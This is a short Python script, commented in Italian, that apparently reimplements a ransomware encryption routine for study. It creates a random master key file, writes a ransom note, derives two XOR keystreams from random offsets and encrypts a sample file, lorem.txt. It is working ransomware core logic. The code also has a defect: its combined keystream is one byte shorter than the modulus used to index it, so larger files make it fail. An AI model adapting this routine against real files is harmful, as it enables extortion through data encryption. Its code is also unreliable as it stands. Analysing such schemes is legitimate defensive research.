import os

# Write the random bytes to a file
def create_masterkey():
    file_size = 10 * 1024 * 1024 # Set the file size (in bytes)
    with open('masterkey.bin', 'wb') as f:
        f.write(os.urandom(file_size))

def open_masterkey():
    with open('masterkey.bin','rb') as f:
        return f.read()

def create_ransomnote():
    note = "This is a ransom note."
    with open('ransom_note.txt','w') as f:
        f.write(note)

def take_keystream(mkey,offset,size):
    return mkey[offset:offset+size]


def full_encrypting(file, ks1, ks2):
    file_stats = os.stat(file)
    encrypted_file = bytearray(file_stats.st_size)
    #• EKS[i]← Keystream1[i] L Keystream2[i%0x400] (i← 0,1,· · · ,0xFFFFF)
    EKS = bytearray(0xFFFFF)
    for i in range(0,0xFFFFF):
        EKS[i] = ks1[i] ^ ks2[i%0x400]

    with open(file,'rb') as f:
        fileinbytes = bytearray(f.read())
        
    for i in range(0,file_stats.st_size):
        encrypted_file[i] = fileinbytes[i] ^ EKS[i%0x100000]

    return encrypted_file

#Fase 1: creazione della master key
create_masterkey()
#Fase 2: creazione del messaggio di riscatto
create_ransomnote()

#Fase 3: generazione keystream
R1 = int.from_bytes(os.urandom(8),"big")
R2 = int.from_bytes(os.urandom(8),"big")
keystream1 = bytearray(take_keystream(open_masterkey(), R1 % 0x900000, 1024*1024)) #Prendiamo un numero casuale di 8 byte, facciamo un'operazione di modulo con il valore 0x900000 e prendiamo da questo offset nella nostra masterkey una porzione di 1MiB.
keystream2 = bytearray(take_keystream(open_masterkey(), R2 % 0x9FFC00, 1024)) #stessa cosa di prima ma l'offset è diverso e prendiamo 1KiB

encrypted_lorem = full_encrypting('./lorem.txt', keystream1, keystream2)
with open('lorem_encrypted.txt','wb') as f:
    f.write(encrypted_lorem)

#print(keystream1)
#print(keystream2)